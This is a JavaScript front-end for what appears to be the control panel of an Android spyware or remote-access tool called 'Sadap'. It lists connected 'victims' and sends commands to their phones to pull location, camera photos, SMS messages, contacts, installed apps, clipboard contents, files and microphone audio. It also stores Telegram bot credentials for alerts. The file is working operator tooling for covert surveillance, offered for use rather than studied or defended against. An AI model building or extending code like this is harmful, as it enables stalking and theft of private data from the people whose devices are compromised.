// Main JavaScript for the Sadap Web Application

// Socket connection
let socket;
let currentVictimUuid = '';
let isConnected = false;

// DOM Elements
document.addEventListener('DOMContentLoaded', function() {
    // Initialize UI components
    initializeUI();
    
    // Check if user is logged in
    checkAuthStatus();
    
    // Initialize socket connection if on dashboard
    if (document.querySelector('.dashboard')) {
        initializeSocket();
    }
    
    // Add event listeners
    addEventListeners();
});

// Initialize UI components
function initializeUI() {
    // Initialize modals
    const modalTriggers = document.querySelectorAll('[data-modal]');
    modalTriggers.forEach(trigger => {
        trigger.addEventListener('click', () => {
            const modalId = trigger.getAttribute('data-modal');
            const modal = document.getElementById(modalId);
            if (modal) {
                openModal(modal);
            }
        });
    });
    
    // Initialize tabs
    const tabs = document.querySelectorAll('.tab');
    tabs.forEach(tab => {
        tab.addEventListener('click', () => {
            const tabId = tab.getAttribute('data-tab');
            activateTab(tabId);
        });
    });
    
    // Initialize mobile menu toggle
    const menuToggle = document.querySelector('.menu-toggle');
    if (menuToggle) {
        menuToggle.addEventListener('click', () => {
            const sidebar = document.querySelector('.sidebar');
            sidebar.classList.toggle('active');
        });
    }
}

// Check authentication status
function checkAuthStatus() {
    // Check if user is logged in
    fetch('/api/auth/status')
        .then(response => response.json())
        .then(data => {
            if (!data.authenticated && !window.location.pathname.includes('/login')) {
                window.location.href = '/login';
            }
        })
        .catch(error => {
            console.error('Error checking auth status:', error);
            showToast('error', 'Authentication Error', 'Failed to verify authentication status');
        });
}

// Initialize WebSocket connection
function initializeSocket() {
    socket = io();
    
    socket.on('connect', () => {
        console.log('Connected to server');
        isConnected = true;
        showToast('success', 'Connected', 'Successfully connected to server');
    });
    
    socket.on('disconnect', () => {
        console.log('Disconnected from server');
        isConnected = false;
        showToast('error', 'Disconnected', 'Lost connection to server');
    });
    
    socket.on('victims', (victims) => {
        updateVictimsList(victims);
    });
    
    socket.on('victim_connected', (victim) => {
        showToast('success', 'New Victim', `${victim.model} has connected`);
        refreshVictimsList();
    });
    
    socket.on('victim_disconnected', (victim) => {
        showToast('warning', 'Victim Disconnected', `${victim.model} has disconnected`);
        refreshVictimsList();
    });
    
    socket.on('command_result', (data) => {
        handleCommandResult(data);
    });
}

// Add event listeners
function addEventListeners() {
    // Login form submission
    const loginForm = document.getElementById('loginForm');
    if (loginForm) {
        loginForm.addEventListener('submit', handleLogin);
    }
    
    // Settings form submission
    const settingsForm = document.getElementById('settingsForm');
    if (settingsForm) {
        settingsForm.addEventListener('submit', handleSettingsUpdate);
    }
    
    // Victim selection
    const victimList = document.querySelector('.victim-list');
    if (victimList) {
        victimList.addEventListener('click', (e) => {
            const row = e.target.closest('tr');
            if (row) {
                const uuid = row.getAttribute('data-uuid');
                if (uuid) {
                    selectVictim(uuid);
                }
            }
        });
    }
    
    // Command buttons
    const actionButtons = document.querySelectorAll('.action-item');
    actionButtons.forEach(button => {
        button.addEventListener('click', () => {
            const command = button.getAttribute('data-command');
            if (command && currentVictimUuid) {
                executeCommand(command, currentVictimUuid);
            }
        });
    });
    
    // Modal close buttons
    const closeButtons = document.querySelectorAll('.modal-close');
    closeButtons.forEach(button => {
        button.addEventListener('click', () => {
            const modal = button.closest('.modal-overlay');
            closeModal(modal);
        });
    });
}

// Handle login form submission
function handleLogin(e) {
    e.preventDefault();
    
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    
    if (!username || !password) {
        showToast('error', 'Login Error', 'Please enter both username and password');
        return;
    }
    
    showLoading();
    
    fetch('/api/auth/login', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ username, password })
    })
    .then(response => response.json())
    .then(data => {
        hideLoading();
        
        if (data.success) {
            window.location.href = '/dashboard';
        } else {
            showToast('error', 'Login Failed', data.message || 'Invalid credentials');
        }
    })
    .catch(error => {
        hideLoading();
        console.error('Login error:', error);
        showToast('error', 'Login Error', 'An error occurred during login');
    });
}

// Handle settings update
function handleSettingsUpdate(e) {
    e.preventDefault();
    
    const telegramToken = document.getElementById('telegramToken').value;
    const telegramUserId = document.getElementById('telegramUserId').value;
    const telegramNotificationId = document.getElementById('telegramNotificationId').value;
    const enableSurya = document.getElementById('enableSurya').checked;
    
    if (!telegramToken || !telegramUserId) {
        showToast('error', 'Settings Error', 'Please enter Telegram token and user ID');
        return;
    }
    
    showLoading();
    
    fetch('/api/settings/update', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            telegramToken,
            telegramUserId,
            telegramNotificationId,
            enableSurya
        })
    })
    .then(response => response.json())
    .then(data => {
        hideLoading();
        
        if (data.success) {
            showToast('success', 'Settings Updated', 'Your settings have been updated successfully');
        } else {
            showToast('error', 'Update Failed', data.message || 'Failed to update settings');
        }
    })
    .catch(error => {
        hideLoading();
        console.error('Settings update error:', error);
        showToast('error', 'Settings Error', 'An error occurred while updating settings');
    });
}

// Update victims list in the UI
function updateVictimsList(victims) {
    const victimListBody = document.querySelector('.victim-list tbody');
    if (!victimListBody) return;
    
    victimListBody.innerHTML = '';
    
    if (victims.length === 0) {
        const emptyRow = document.createElement('tr');
        emptyRow.innerHTML = `<td colspan="5" class="text-center">No victims connected</td>`;
        victimListBody.appendChild(emptyRow);
        return;
    }
    
    victims.forEach(victim => {
        const row = document.createElement('tr');
        row.setAttribute('data-uuid', victim.uuid);
        
        row.innerHTML = `
            <td>${victim.model}</td>
            <td>${victim.battery}%</td>
            <td>${victim.provider}</td>
            <td>${victim.version}</td>
            <td>
                <button class="action-btn" title="View Details">
                    <i class="fas fa-eye"></i>
                </button>
                <button class="action-btn" title="Control Device">
                    <i class="fas fa-terminal"></i>
                </button>
            </td>
        `;
        
        victimListBody.appendChild(row);
    });
}

// Refresh victims list
function refreshVictimsList() {
    if (socket && isConnected) {
        socket.emit('get_victims');
    }
}

// Select a victim
function selectVictim(uuid) {
    currentVictimUuid = uuid;
    
    // Navigate to victim detail page
    window.location.href = `/victim/${uuid}`;
}

// Execute command on victim device
function executeCommand(command, uuid, params = {}) {
    if (!socket || !isConnected) {
        showToast('error', 'Connection Error', 'Not connected to server');
        return;
    }
    
    showLoading();
    
    socket.emit('execute_command', {
        command,
        uuid,
        params
    });
    
    // For commands that require input, show appropriate modal
    if (command === 'send_message') {
        openModal(document.getElementById('smsModal'));
    } else if (command === 'file') {
        openModal(document.getElementById('fileModal'));
    } else if (command === 'microphone') {
        openModal(document.getElementById('microphoneModal'));
    } else if (command === 'show_notification') {
        openModal(document.getElementById('notificationModal'));
    }
}

// Handle command result
function handleCommandResult(data) {
    hideLoading();
    
    const { command, success, result, error } = data;
    
    if (success) {
        showToast('success', 'Command Executed', `Successfully executed ${command}`);
        
        // Handle specific command results
        if (command === 'location') {
            updateLocationView(result);
        } else if (command === 'camera_main' || command === 'camera_selfie') {
            updateCameraView(result);
        } else if (command === 'messages') {
            updateMessagesView(result);
        } else if (command === 'contacts') {
            updateContactsView(result);
        } else if (command === 'apps') {
            updateAppsView(result);
        } else if (command === 'device_info') {
            updateDeviceInfoView(result);
        } else if (command === 'clipboard') {
            updateClipboardView(result);
        }
    } else {
        showToast('error', 'Command Failed', error || `Failed to execute ${command}`);
    }
}

// Update location view
function updateLocationView(locationData) {
    const locationMap = document.getElementById('locationMap');
    const locationCoordinates = document.getElementById('locationCoordinates');
    
    if (locationMap && locationCoordinates && locationData) {
        // Update map (this would typically use a mapping library like Leaflet or Google Maps)
        // For now, just show the coordinates
        locationCoordinates.textContent = `Latitude: ${locationData.lat}, Longitude: ${locationData.lon}`;
    }
}

// Update camera view
function updateCameraView(imageData) {
    const cameraView = document.getElementById('cameraView');
    
    if (cameraView && imageData) {
        cameraView.innerHTML = `<img src="data:image/jpeg;base64,${imageData}" alt="Camera Image" style="max-width: 100%; max-height: 300px;">`;
    }
}

// Update messages view
function updateMessagesView(messages) {
    const messagesContainer = document.getElementById('smsContainer');
    
    if (messagesContainer && messages) {
        messagesContainer.innerHTML = '';
        
        messages.forEach(message => {
            const messageElement = document.createElement('div');
            messageElement.className = `sms-message ${message.type === 'received' ? 'sms-received' : 'sms-sent'}`;
            
            messageElement.innerHTML = `
                <div class="sms-header">
                    <span>${message.sender || message.recipient}</span>
                    <span>${message.date}</span>
                </div>
                <div class="sms-content">${message.content}</div>
            `;
            
            messagesContainer.appendChild(messageElement);
        });
    }
}

// Update contacts view
function updateContactsView(contacts) {
    const contactsContainer = document.getElementById('contactsContainer');
    
    if (contactsContainer && contacts) {
        contactsContainer.innerHTML = '';
        
        contacts.forEach(contact => {
            const contactElement = document.createElement('div');
            contactElement.className = 'contact-item';
            
            contactElement.innerHTML = `
                <div class="contact-name">${contact.name}</div>
                <div class="contact-number">${contact.number}</div>
            `;
            
            contactsContainer.appendChild(contactElement);
        });
    }
}

// Update apps view
function updateAppsView(apps) {
    const appsContainer = document.getElementById('appsContainer');
    
    if (appsContainer && apps) {
        appsContainer.innerHTML = '';
        
        apps.forEach(app => {
            const appElement = document.createElement('div');
            appElement.className = 'app-item';
            
            appElement.innerHTML = `
                <div class="app-icon"><i class="fas fa-mobile-alt"></i></div>
                <div class="app-name">${app.name}</div>
                <div class="app-package">${app.package}</div>
            `;
            
            appsContainer.appendChild(appElement);
        });
    }
}

// Update device info view
function updateDeviceInfoView(info) {
    const deviceInfoContainer = document.getElementById('deviceInfoContainer');
    
    if (deviceInfoContainer && info) {
        deviceInfoContainer.innerHTML = '';
        
        for (const [key, value] of Object.entries(info)) {
            const infoElement = document.createElement('div');
            infoElement.className = 'info-item';
            
            infoElement.innerHTML = `
                <label>${key}</label>
                <p>${value}</p>
            `;
            
            deviceInfoContainer.appendChild(infoElement);
        }
    }
}

// Update clipboard view
function updateClipboardView(clipboardData) {
    const clipboardContainer = document.getElementById('clipboardContainer');
    
    if (clipboardContainer && clipboardData) {
        clipboardContainer.innerHTML = `<pre>${clipboardData}</pre>`;
    }
}

// Show loading overlay
function showLoading() {
    const loadingOverlay = document.createElement('div');
    loadingOverlay.className = 'loading-overlay';
    loadingOverlay.innerHTML = '<div class="spinner"></div>';
    document.body.appendChild(loadingOverlay);
}

// Hide loading overlay
function hideLoading() {
    const loadingOverlay = document.querySelector('.loading-overlay');
    if (loadingOverlay) {
        loadingOverlay.remove();
    }
}

// Show toast notification
function showToast(type, title, message) {
    let toastContainer = document.querySelector('.toast-container');
    
    if (!toastContainer) {
        toastContainer = document.createElement('div');
        toastContainer.className = 'toast-container';
        document.body.appendChild(toastContainer);
    }
    
    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    
    let icon = '';
    switch (type) {
        case 'success':
            icon = 'fas fa-check-circle';
            break;
        case 'error':
            icon = 'fas fa-exclamation-circle';
            break;
        case 'warning':
            icon = 'fas fa-exclamation-triangle';
            break;
        case 'info':
            icon = 'fas fa-info-circle';
            break;
    }
    
    toast.innerHTML = `
        <div class="toast-icon"><i class="${icon}"></i></div>
        <div class="toast-content">
            <div class="toast-title">${title}</div>
            <div class="toast-message">${message}</div>
        </div>
        <button class="toast-close"><i class="fas fa-times"></i></button>
    `;
    
    toastContainer.appendChild(toast);
    
    // Add event listener to close button
    toast.querySelector('.toast-close').addEventListener('click', () => {
        toast.remove();
    });
    
    // Auto-remove toast after 5 seconds
    setTimeout(() => {
        toast.remove();
    }, 5000);
}

// Open modal
function openModal(modal) {
    if (!modal) return;
    
    const overlay = modal.closest('.modal-overlay') || modal;
    overlay.classList.add('active');
}

// Close modal
function closeModal(modal) {
    if (!modal) return;
    
    const overlay = modal.closest('.modal-overlay') || modal;
    overlay.classList.remove('active');
}

// Activate tab
function activateTab(tabId) {
    // Deactivate all tabs
    document.querySelectorAll('.tab').forEach(tab => {
        tab.classList.remove('active');
    });
    
    // Hide all tab contents
    document.querySelectorAll('.tab-content').forEach(content => {
        content.classList.remove('active');
    });
    
    // Activate selected tab
    document.querySelector(`.tab[data-tab="${tabId}"]`).classList.add('active');
    document.querySelector(`.tab-content[data-tab="${tabId}"]`).classList.add('active');
}
